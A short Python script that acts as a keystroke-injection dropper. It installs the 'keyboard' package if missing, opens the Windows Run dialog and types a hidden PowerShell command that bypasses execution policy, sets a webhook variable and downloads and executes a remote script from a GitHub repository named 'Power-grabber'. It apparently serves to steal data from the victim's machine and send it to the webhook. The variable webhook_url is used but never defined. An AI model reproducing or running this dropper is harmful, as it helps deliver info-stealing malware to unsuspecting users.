import time
import sys
import subprocess
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
try:
    import keyboard
except ImportError:
    install("keyboard")
    import keyboard
def type_text(text):
    for char in text:
        keyboard.press_and_release(char)
time.sleep(1)
keyboard.press_and_release("win+r")
time.sleep(0.01)
command = f"powershell -NoP -Ep Bypass -W H -C $dc='{webhook_url}'; irm https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/taktikal | iex"
type_text(command)  
keyboard.press_and_release("enter")
